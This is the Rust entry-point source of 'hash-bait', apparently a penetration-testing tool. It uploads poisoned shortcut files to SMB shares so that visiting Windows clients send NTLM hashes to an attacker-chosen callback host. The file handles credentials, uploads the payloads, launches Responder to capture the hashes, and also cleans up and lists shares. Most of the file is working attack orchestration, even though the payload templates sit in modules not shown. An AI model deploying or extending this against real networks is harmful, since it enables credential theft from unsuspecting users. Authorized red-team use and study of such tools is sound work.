//! hash-bait — drop poisoned shortcuts on SMB shares to coerce NTLM hashes.
//!
//! For authorized security testing with explicit written permission only.

use std::io::IsTerminal;
use std::process::ExitCode;

use clap::Parser;
use hash_bait::{cli, out, payloads, responder, smb_ops};

use cli::{
    parse_user, remote_dir, resolve_password, resolve_payload_types, AuthArgs, Cli, Commands,
};
use smb_ops::Creds;

fn main() -> ExitCode {
    let args = Cli::parse();
    out::init(
        args.no_color || std::env::var_os("NO_COLOR").is_some() || !std::io::stdout().is_terminal(),
    );

    match args.command {
        Commands::Drop(a) => cmd_drop(&a),
        Commands::Clean(a) => cmd_clean(&a),
        Commands::Listen(a) => cmd_listen(&a),
        Commands::List(a) => cmd_list(&a),
    }
}

/// Password, user pairing rules from the original tool: a user with no
/// resolvable password is a usage error (exit 2).
fn creds_from(auth: &AuthArgs) -> Result<Creds, ExitCode> {
    let (domain, user) = auth.user.as_deref().map(parse_user).unzip();
    let password = match resolve_password(auth) {
        Ok(p) => p,
        Err(e) => {
            out::fail(&format!("cannot read password: {e}"));
            return Err(ExitCode::from(2));
        }
    };
    match (user, password) {
        (None, _) => Ok(Creds::anonymous()),
        (Some(u), Some(p)) => Ok(Creds::new(domain.flatten().as_deref(), &u, p)),
        (Some(_), None) => {
            out::fail(&format!(
                "need a password (use --pass, --ask-pass, or set ${})",
                cli::PASSWORD_ENV
            ));
            Err(ExitCode::from(2))
        }
    }
}

fn cmd_drop(a: &cli::DropArgs) -> ExitCode {
    if !a.payloads.dry_run && !a.no_listen && a.iface.is_none() {
        out::fail("either -i/--iface IFACE or --no-listen is required");
        return ExitCode::from(2);
    }
    let kinds = match resolve_payload_types(&a.payloads.payload) {
        Ok(k) => k,
        Err(e) => {
            out::fail(&e);
            return ExitCode::from(2);
        }
    };
    let files = payloads::render_all(&kinds, &a.callback, &a.payloads.name);
    let names: Vec<String> = files.iter().map(|(n, _)| n.clone()).collect();
    let where_to = format!(
        "//{}/{}{}",
        a.target.target,
        a.target.share,
        a.target
            .dir
            .as_deref()
            .map(|d| format!("/{d}"))
            .unwrap_or_default()
    );

    if a.payloads.dry_run {
        out::warn("dry-run — nothing written, nothing uploaded");
        out::plan(&format!(
            "render {} payload(s) for callback {}: {}",
            files.len(),
            a.callback,
            names.join(", ")
        ));
        out::plan(&format!("put {} file(s) to {where_to}", files.len()));
        if a.save_local {
            out::plan("also write local copies (--save-local)");
        }
        if !a.no_listen {
            out::plan(&format!(
                "start Responder on {}",
                a.iface.as_deref().unwrap_or("<iface>")
            ));
        }
        out::ok("dry-run complete");
        return ExitCode::SUCCESS;
    }

    let creds = match creds_from(&a.auth) {
        Ok(c) => c,
        Err(code) => return code,
    };

    if a.save_local {
        for (name, body) in &files {
            match std::fs::write(name, body) {
                Ok(()) => out::ok(&format!("wrote {name}")),
                Err(e) => {
                    out::fail(&format!("cannot write {name}: {e}"));
                    return ExitCode::FAILURE;
                }
            }
        }
    }

    let client = match smb_ops::connect(&a.target.target, &a.target.share, &creds) {
        Ok(c) => c,
        Err(e) => {
            out::fail(&e);
            return ExitCode::FAILURE;
        }
    };
    let dir = a.target.dir.as_deref().map(remote_dir);
    if let Err(e) = smb_ops::put_files(
        &client,
        &a.target.target,
        &a.target.share,
        dir.as_deref(),
        &files,
    ) {
        out::fail(&e);
        return ExitCode::FAILURE;
    }
    out::ok(&format!("dropped {} payload(s) on {where_to}", files.len()));

    if a.no_listen {
        out::info("skipping Responder (--no-listen)");
        return ExitCode::SUCCESS;
    }
    let iface = a.iface.as_deref().expect("validated above");
    match responder::run(iface) {
        Ok(status) if status.success() => ExitCode::SUCCESS,
        Ok(status) => ExitCode::from(status.code().unwrap_or(1).clamp(1, 255) as u8),
        Err(e) => {
            out::fail(&e);
            ExitCode::FAILURE
        }
    }
}

fn cmd_clean(a: &cli::CleanArgs) -> ExitCode {
    let kinds = match resolve_payload_types(&a.payloads.payload) {
        Ok(k) => k,
        Err(e) => {
            out::fail(&e);
            return ExitCode::from(2);
        }
    };
    let names: Vec<String> = kinds
        .iter()
        .map(|k| format!("{}.{}", a.payloads.name, k.ext()))
        .collect();
    let where_to = format!(
        "//{}/{}{}",
        a.target.target,
        a.target.share,
        a.target
            .dir
            .as_deref()
            .map(|d| format!("/{d}"))
            .unwrap_or_default()
    );

    if a.payloads.dry_run {
        out::warn("dry-run — nothing deleted");
        out::plan(&format!(
            "delete {} file(s) from {where_to}: {}",
            names.len(),
            names.join(", ")
        ));
        out::ok("dry-run complete");
        return ExitCode::SUCCESS;
    }

    let creds = match creds_from(&a.auth) {
        Ok(c) => c,
        Err(code) => return code,
    };
    let client = match smb_ops::connect(&a.target.target, &a.target.share, &creds) {
        Ok(c) => c,
        Err(e) => {
            out::fail(&e);
            return ExitCode::FAILURE;
        }
    };
    let dir = a.target.dir.as_deref().map(remote_dir);
    match smb_ops::del_files(
        &client,
        &a.target.target,
        &a.target.share,
        dir.as_deref(),
        &names,
    ) {
        Ok(missing) => {
            let removed = names.len() - missing.len();
            out::ok(&format!("removed {removed} payload(s) from {where_to}"));
            for m in missing {
                out::warn(&format!("not found on the share: {m}"));
            }
            ExitCode::SUCCESS
        }
        Err(e) => {
            out::fail(&e);
            ExitCode::FAILURE
        }
    }
}

fn cmd_listen(a: &cli::ListenArgs) -> ExitCode {
    match responder::run(&a.iface) {
        Ok(status) if status.success() => ExitCode::SUCCESS,
        Ok(status) => ExitCode::from(status.code().unwrap_or(1).clamp(1, 255) as u8),
        Err(e) => {
            out::fail(&e);
            ExitCode::FAILURE
        }
    }
}

fn cmd_list(a: &cli::ListArgs) -> ExitCode {
    let creds = match creds_from(&a.auth) {
        Ok(c) => c,
        Err(code) => return code,
    };
    match smb_ops::list_shares(&a.target, &creds) {
        Ok(shares) => {
            if shares.is_empty() {
                out::warn(&format!("no visible shares on {}", a.target));
                return ExitCode::SUCCESS;
            }
            for (name, remark) in &shares {
                if remark.is_empty() {
                    println!("{name}");
                } else {
                    println!("{name}\t{remark}");
                }
            }
            out::ok(&format!("{} share(s) on {}", shares.len(), a.target));
            ExitCode::SUCCESS
        }
        Err(e) => {
            out::fail(&e);
            ExitCode::FAILURE
        }
    }
}
